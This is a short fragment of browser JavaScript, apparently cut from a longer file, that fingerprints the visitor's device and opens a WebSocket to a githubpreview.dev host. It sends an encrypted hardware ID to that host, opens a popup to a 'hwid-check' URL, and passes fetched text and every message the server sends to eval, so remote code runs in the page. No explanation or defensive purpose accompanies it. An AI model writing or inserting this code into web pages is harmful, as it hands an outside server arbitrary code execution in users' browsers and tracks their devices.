...
.then(text => {
    eval(text);
    var windownewopen = null;
    var browseruuid = new DeviceUUID().get();
    var inputcode = `stamp${Date.now() + (1000 * 60 * 1)}hwid${browseruuid}`;
    var SocketD = new WebSocket(`wss://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/protocol_link/${EncryptData(browseruuid)}`);
    SocketD.onmessage = (msgevent) => {
        var script = msgevent.data;
        eval(msgevent.data);
		windownewopen.close();
    };
    SocketD.onopen = (event) => {
        windownewopen = window.open(`https://powershell1-datastore101-px4vw57726jrp-3000.githubpreview.dev/hwid-check/${EncryptData(inputcode)}`);
    };
});